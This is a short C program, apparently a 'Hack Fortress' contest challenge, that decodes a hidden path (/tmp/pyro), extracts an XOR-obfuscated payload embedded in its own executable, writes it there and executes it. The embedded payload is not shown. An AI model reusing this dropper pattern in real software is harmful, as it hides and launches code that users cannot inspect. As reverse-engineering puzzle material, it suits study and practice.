#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

unsigned char r[3780];

char path[] = { 64,133,126,129,64,129,138,131,128 };

int readFile(char *inName, char *outName);
void stepTwo();

int main(int argc, char** argv)
{

  printf("\n[ H A C K | F O R T R E S S ]\n\n");
  printf("MMMRmmmmmM! (It is really hard to imitate the pyro voice in text)\n\n");

  int i = 0;
  for( i; i < 9; i++ )
  {
    path[i] = path[i]-17;
  }

  if( readFile(argv[0], path ) )
    stepTwo(path);

  exit(0);

}

int readFile(char *inName, char *outName)
{
  FILE *in, *out;
  //unsigned long fileLen;

  //Open file
  in = fopen(inName, "rb");
  if (!in)
  {
    return 0;
  }
 
  //Read file contents into buffer starting at offset
  fseek(in, 3936, SEEK_SET);
  fread(r, (sizeof(r)/sizeof(unsigned char)), 1, in);
  
  fclose(in);

  int i = 0;
 
  for( i; i < (sizeof(r)/sizeof(unsigned char)); i++ )
  {
    r[i]=(r[i]^1);
  }
 
 
  out = fopen( outName, "wb" );
  if (!out)
  {
    return 0;
  }
  
  fwrite(r, 1, (sizeof(r)/sizeof(unsigned char)), out);

  fclose(out);

  return 1;

}

void stepTwo(char* path) {
  chmod(path, S_IRWXU);
  execl(path, path, '\0'); 
}

